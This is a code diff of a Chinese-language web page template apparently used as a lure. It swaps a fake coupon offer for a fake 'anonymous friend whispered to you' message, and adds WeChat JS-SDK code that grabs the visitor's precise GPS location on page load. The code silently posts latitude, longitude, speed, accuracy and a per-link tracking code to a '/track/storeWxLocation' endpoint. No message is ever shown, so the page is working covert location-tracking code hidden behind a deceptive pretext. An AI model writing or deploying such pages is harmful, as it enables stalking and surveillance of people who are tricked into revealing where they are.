@@ -6,53 +6,41 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <!-- CSRF Token -->
     <meta name="csrf-token" content="{{ csrf_token() }}">
-    <title>您的好友给您分享1折优惠券啦！</title>
+    <title>您的匿名好友，对你说了一句悄悄话！</title>
     <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
+    <script src="http://res.wx.qq.com/open/js/jweixin-1.2.0.js" type="text/javascript" charset="utf-8"></script>
 </head>
 <body>
 <img src="{{ asset('images/quan.jpg') }}" width="100%" />
-<h1>您的好友给您分享1折优惠券啦，赶快来领取吧！</h1>
+<h1>您的匿名好友，对你说了一句悄悄话，立即查看吧</h1>
 <script>
     $.ajaxSetup({
         headers: {
             'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
         }
     });
-    function getLocation(){
-        if (navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(showPosition,showError);
-        }else{
-            alert("浏览器不支持地理定位。");
-        }
-    }
+    wx.config({{$app->jssdk->buildConfig(['getLocation'], true)}});
+    wx.ready(function() {
+        wx.getLocation({
+            type: 'wgs84', // 默认为wgs84的gps坐标，如果要返回直接给openLocation用的火星坐标，可传入'gcj02'
+            success: function (res) {
+                var latitude = res.latitude; // 纬度，浮点数，范围为90 ~ -90
+                var longitude = res.longitude; // 经度，浮点数，范围为180 ~ -180。
+                var speed = res.speed; // 速度，以米/每秒计
+                var accuracy = res.accuracy; // 位置精度
 
-    function showError(error){
-        switch(error.code) {
-            case error.PERMISSION_DENIED:
-                // alert("定位失败,用户拒绝请求地理定位");
-                break;
-            case error.POSITION_UNAVAILABLE:
-                // alert("定位失败,位置信息是不可用");
-                break;
-            case error.TIMEOUT:
-                // alert("定位失败,请求获取用户位置超时");
-                break;
-            case error.UNKNOWN_ERROR:
-                // alert("定位失败,定位系统失效");
-                break;
-        }
-    }
-
-    function showPosition(position){
-        var lat = position.coords.latitude; //纬度
-        var lag = position.coords.longitude; //经度
-        $.post("{{url('/track/statics')}}", {lat: lat, lag: lag});
-    }
-
-    getLocation();
-
-
-
+                $.post("{{url('/track/storeWxLocation')}}", {
+                    latitude: latitude,
+                    longitude: longitude,
+                    speed: speed,
+                    accuracy: accuracy,
+                    code: '{{$code}}'
+                }, function(res) {
+                    console.log(res, '定位成功');
+                })
+            }
+        });
+    });
 </script>
 </body>
 </html>
